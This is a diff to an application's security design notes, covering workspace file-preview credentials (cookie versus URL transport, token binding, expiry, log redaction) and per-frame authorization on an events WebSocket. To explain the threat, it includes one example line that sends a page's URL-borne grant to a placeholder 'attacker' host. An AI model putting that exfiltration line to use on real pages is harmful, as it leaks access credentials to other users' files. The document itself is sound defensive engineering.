@@ -477,6 +477,70 @@ which is correct for the bundled same-origin SPA: the CORS middleware is still r
 cross-origin request without an `Access-Control-Allow-Origin` header, so no other site can read a
 response. CORS is skipped entirely only when `LmStreaming:EnableCors` is set to `false`.
 
+### Workspace file previews carry their own credential (Bug#15)
+
+`GET /api/conversations/{threadId}/workspace/{grant}/{**path}` serves a workspace file so a rendered
+HTML page's own relative links (`img/x.png`, `../shared/style.css`) resolve to sibling workspace
+files. A **grant is the credential on that route**. It exists because the fetches that use it — an
+`<iframe src>`, an `<img src>`, a stylesheet `<link>` inside the served document — cannot carry an
+`Authorization` header, so under `Identity:Enforce` the identity middleware would refuse every one of
+them before routing and the preview pane would go blank with no error the client can see.
+
+**The grant travels one of two ways, and the CLIENT picks which.** The served document is sandboxed
+but keeps `allow-scripts`, and a sandboxed document may always navigate itself — no CSP directive
+stops that — so a credential in its own URL is one `location.href = 'https://attacker/?g=' +
+location.pathname` away from leaving. So:
+
+- **Cookie transport (the default).** The mint answers `Set-Cookie: lm_ws_grant=<token>; HttpOnly;
+  Secure; SameSite=None; Partitioned`, with **no `Domain`** (host-only) and `Path` scoped to
+  `/api/conversations/{threadId}/workspace/`, so the browser never sends it anywhere else. The
+  `{grant}` segment then carries only the constant public marker `cookie`, which is all a script
+  inside the document can read — and which, presented without the cookie, is refused exactly as a
+  forged token is. `SameSite=None` is required because the sandbox gives the document an opaque
+  origin, so the browser classes its subresource requests as cross-site; `Partitioned` (CHIPS) keeps
+  the cookie eligible where third-party cookies are blocked.
+- **URL transport (the fallback).** The `{grant}` segment is the token itself. This is what a
+  deployment served over plain `http` from something other than `localhost` gets, because a browser
+  will not store a `Secure` cookie there. The client chooses from `window.isSecureContext`, which is
+  true exactly where a `Secure` cookie is accepted; this host cannot make the choice itself because
+  it may sit behind an https front that does not forward its scheme.
+
+A client that sends no body at all still gets the URL transport, so nothing written before this
+existed breaks.
+
+The grant is minted by `POST /api/conversations/{threadId}/files/grant` (body
+`{"transport":"cookie"|"url"}`, optional), which is an ordinary bearer-authenticated request and is
+authorized through the same `ConversationAuthorizer` (`AccessAction.Read`) as every other file
+route. It is an ASP.NET Core Data Protection token —
+encrypted and authenticated with this host's key ring — and it **binds**: the conversation it was
+minted for, and the full principal of the caller who minted it (tenant, actor, on-behalf-of, app id,
+scopes, roles). It lives for **one hour**; the client re-mints five minutes before that. Presenting
+it on another conversation is `403`; a forged, altered or expired one is `401`. `WorkspaceGrantPrincipalSource`
+reconstructs the principal from the grant so the raw route runs with the same identity, and the same
+authorization prologue, as any other request — the grant authenticates, it never authorizes.
+
+Operator notes:
+
+- Configure data-protection key persistence (`PersistKeysTo…` plus `ProtectKeysWith…`) for any
+  containerised or scaled-out deployment. Keys default to the local profile, so each replica has its
+  own ring and every restart invalidates outstanding grants. The symptom is a burst of `401`s on
+  preview subresources, not an outage: the client re-mints on the next open.
+- **Under the URL transport only**, the grant is a bearer value in a URL path. This host redacts it
+  out of its own request log (`Program.RedactWorkspaceGrant` rewrites the segment to `[grant]`), and
+  never logs it anywhere else. A reverse proxy, CDN or load balancer in front of this host writes its
+  own access log that this process cannot redact — redact `/api/conversations/*/workspace/*` there
+  too if those logs leave your trust boundary. Browser history and the address bar of an "open in new
+  tab" are accepted residual, bounded by the one-hour lifetime and by the grant reading one
+  conversation's workspace and nothing else. Under the cookie transport none of this applies: the
+  path segment is a public constant.
+- **Serve this app over https** (or from `localhost`). That is not only a transport concern here: it
+  is what lets the client use the cookie transport at all, and the URL transport it otherwise falls
+  back to is the one that exposes a live read credential to the previewed page.
+- `Partitioned` (CHIPS) is honoured by Chromium. A browser that does not know the attribute ignores
+  it and keeps the `SameSite=None` cookie, which is the pre-CHIPS behaviour and still correct; a
+  browser that blocks third-party cookies **without** supporting CHIPS would drop it, and the preview
+  pane goes blank until the page is reloaded. There is no server-side signal for this.
+
 ### Recommended flip order
 
 1. Deploy the build. Leave `Identity:Enforce` false. The schema migrates (`user_version` 4), the
@@ -691,7 +755,8 @@ creates nothing, touches no pooled entry, and never reaches `AcceptWebSocketAsyn
   `GET /api/conversations/{threadId}/subagents` already demands, and then checks that the named child
   is actually that parent's, using the durable link `SubAgentProvenance` stamps. Without the second
   check the first is a formality: a caller passes their own parent id with someone else's `agentId`,
-  the parent-scoped live lookups miss, and the handler replays `subagent-{agentId}` out of the store.
+  the parent-scoped live lookups miss, and the handler replays the child's `subagent-{scope}-{agentId}`
+  thread out of the store.
 - **A child whose provenance does not check out does not refuse the handshake.** It loses the
   persisted replay and the socket answers `subagent_unavailable` — byte for byte what an `agentId`
   that names nothing answers. Refusing the handshake instead would make the two tell apart, which is
@@ -706,6 +771,29 @@ creates nothing, touches no pooled entry, and never reaches `AcceptWebSocketAsyn
 - **An existence-hiding refusal is a `404` whose body is identical to the REST surface's**
   `unknown_thread`. A never-minted id and another tenant's id answer the same; a refusal that already
   admits the id names something keeps its `403`, and never a `401` (same reasoning as #342).
+
+#### `/ws/events` authorizes per FRAME, because it names no conversation
+
+The app-wide pending-question stream (`PendingQuestionHub`, consumed by `api/eventsWsClient.ts`) is a
+third WebSocket transport. `IsGuardedWebSocketPath` is segment-based on `/ws`, so it is inside the
+same boundary as the two above and the handshake demands a signed-in principal under enforcement —
+but it takes no `threadId`, so there is nothing for `WebSocketConversationGate` to authorize there.
+
+Authorization therefore moves to each frame:
+
+- The handshake captures `context.Items[IdentityHttpItems.PrincipalKey]` and holds it for the life of
+  the connection. It must be captured, not read later: the broadcast pump is a background loop with
+  no ambient request, and `IPrincipalAccessor` is request-scoped by design.
+- Every `snapshot` row and every `question_pending` / `question_settled` frame is checked against that
+  captured principal with the **same** `ConversationAuthorizer` the REST routes and `/ws` use, for
+  `Read` on the question's ROOT thread. `ConversationAuthorizer` grew a principal-taking overload for
+  this; it did not grow a second copy of the policy.
+- `Read`, not `Write`, because this channel confers nothing. It reports that a question is waiting and
+  which conversation to go to; answering it still means opening `/ws`, which demands `Write`.
+- With `Identity:Enforce` off, `ConversationAuthorizer.IsEnforced` is false and every frame is
+  visible — the same "no enforcement, no filtering" posture the rest of the surface has.
+- Frames carry ids, the conversation title and the FIRST question's prompt text. No transcript, no
+  tool arguments beyond that prompt, and no message content.
 
 **`auth/{providerId}`: decided, and half of it closed.** The signed-in page no longer renders the
 account, the granted scopes or the token expiry. `IOAuthTokenProvider` is a process-wide singleton, so
